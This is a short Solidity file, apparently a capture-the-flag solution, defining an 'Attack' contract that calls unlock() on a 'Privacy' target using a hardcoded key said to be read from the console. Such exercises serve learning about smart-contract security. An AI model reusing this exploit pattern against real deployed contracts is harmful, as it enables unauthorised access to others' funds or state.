//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IPrivacy{
    function unlock(bytes16 _key) external;
}

contract Attack{
    IPrivacy target;
    //the key extracted from the console
    bytes16 data = 0x08bdea200195df3f2988748731c26e37;

    constructor( address _a) {
        target = IPrivacy(_a);
    }

    function attack() public {
    //the call to the unlock() fct using the key
        target.unlock(data);
    }
}
